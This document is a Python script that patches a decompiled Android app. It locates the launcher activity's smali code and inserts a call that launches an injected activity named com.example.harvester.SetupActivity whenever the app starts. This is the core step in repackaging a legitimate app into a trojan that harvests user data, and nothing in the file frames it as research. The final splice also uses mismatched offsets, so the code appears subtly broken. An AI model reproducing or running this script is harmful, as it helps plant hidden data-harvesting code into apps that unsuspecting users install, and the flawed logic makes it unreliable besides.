#!/usr/bin/env python3
import re, glob, sys

vsrc = sys.argv[1]
mani = open(vsrc + "/AndroidManifest.xml").read()

launcher = None
for m in re.finditer(r"<activity\s+([^>]*)>", mani):
    tail = mani[m.end():m.end() + 400]
    if "android.intent.action.MAIN" in tail:
        n = re.search(r'android:name="([^"]+)"', m.group(1))
        if n:
            launcher = n.group(1)
            break

if not launcher:
    launcher = re.search(r'<activity[^>]*android:name="([^"]+)"', mani).group(1)

print("LAUNCHER=" + launcher)

cands = glob.glob(vsrc + "/smali*/" + launcher.replace(".", "/") + ".smali")
assert cands, "launcher smali not found"

path = cands[0]
s = open(path).read()

m = re.search(r"\.method[^\n]*\bonCreate\(Landroid/os/Bundle;\)V(.*?)\.end method", s, re.S)
assert m, "onCreate not found in " + path

body = m.group(1)

# Search for .registers in the full method match, not just the body
full_match = m.group(0)
lm = re.search(r"\.registers\s+(\d+)", full_match)
assert lm, "no .registers in onCreate"

n = int(lm.group(1))
# Replace .registers in the body section
body = re.sub(r"\.registers\s+\d+", ".registers %d" % (n + 2), body, count=1)

v = "v%d" % n
v2 = "v%d" % (n + 1)

block = (
    "\n    new-instance %s, Landroid/content/Intent;\n" % v
    + "    const-class %s, Lcom/example/harvester/SetupActivity;\n" % v2
    + "    invoke-direct {%s, p0, %s}, Landroid/content/Intent;<init>(Landroid/content/Context;Ljava/lang/Class;)V\n" % (v, v2)
    + "    invoke-virtual {p0, %s}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V\n" % v
)

rv = body.rfind("return-void")
assert rv != -1, "no return-void in onCreate"

body = body[:rv] + block + body[rv:]

full = m.group(0)
pre = full[:m.start(1)]
post = full[m.end(1):]

s = s[:m.start()] + pre + body + post + s[m.end():]

open(path, "w").write(s)
print("main patched: " + path)
